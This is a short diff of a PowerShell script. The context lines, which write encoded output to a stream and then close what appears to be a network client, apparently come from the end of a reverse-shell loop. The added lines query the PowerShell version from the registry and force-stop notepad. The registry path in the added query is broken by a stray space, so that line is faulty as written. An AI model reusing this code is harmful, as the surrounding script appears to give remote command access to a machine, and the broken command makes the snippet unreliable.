@@ -40,3 +40,8 @@ $U = [text.encoding]::ASCII.GetBytes($I2);
 $replace.Write($U,0,$U.Length);
 $replace.Flush()};
 $BT.Close()
+
+
+(Get-ItemProperty HKLM:\SOFTWARE\Microsoft\PowerShell\*\PowerShellEngin e -Name PowerShellVersion).PowerShellVersion
+
+Get-Process notepad | Stop-Process -Force
